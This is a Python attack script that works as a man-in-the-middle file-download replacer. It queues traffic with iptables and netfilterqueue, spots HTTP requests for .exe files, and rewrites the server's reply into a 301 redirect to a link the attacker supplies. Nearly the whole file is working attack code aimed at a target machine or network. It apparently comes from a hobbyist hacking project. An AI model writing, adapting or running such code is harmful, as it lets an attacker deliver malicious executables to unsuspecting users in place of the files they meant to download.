#!/usr/bin/env python3

# @Author - Avish Dhirawat
# Date - 16/08/2020

import netfilterqueue
import subprocess
import scapy.all as scapy
import argparse

ack_list = []

def get_arguments(): # Function to get arguments in command line
    parser = argparse.ArgumentParser()
    parser.add_argument('-c', '--choice', dest = "choice", help = "Choice for Intersystem Spoofing(1) and Intrasystem Spoofing(2)")
    parser.add_argument('-r', '--replace', dest = "replace_download_link", help = "Link you want to forward the target to download replaced file")
    options = parser.parse_args()
    if options.choice not in [1,2,"1","2"]:
        parser.error("[-] Please enter correct options for choice, use --help for more info")
    elif not options.replace_download_link:
        parser.error("[-] Please specify the replace link, use --help for more info")
    else:
        return options

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            #print "{+} HTTP Request > \n"
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                #print scapy_packet.show()
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: "+str(replace_download_link)+"\n\n"

                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum
                #print scapy_packet.show()
                packet.set_payload(str(scapy_packet))
                print("[+] File replaced")

    packet.accept()

try:
    options = get_arguments()
    choice = options.choice
    replace_download_link = options.replace_download_link

    if(choice == 1 or choice == "1"): # Had to add "or" condition so that it supports both python2 and python3
        subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell = True)
        print("\n[+] Created IPTABLE for FORWARD\n")
    elif(choice == 2 or choice == "2"):
        subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell = True)
        subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell = True)
        print("\n[+] Created iptable for INPUT and OUTPUT\n")
    else:
        print("[-] Invalid Choice.... Exiting.....")
        exit()


    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\n[-] Detected CTRL+C........ Exiting... ....")
    subprocess.call("iptables --flush", shell = True)
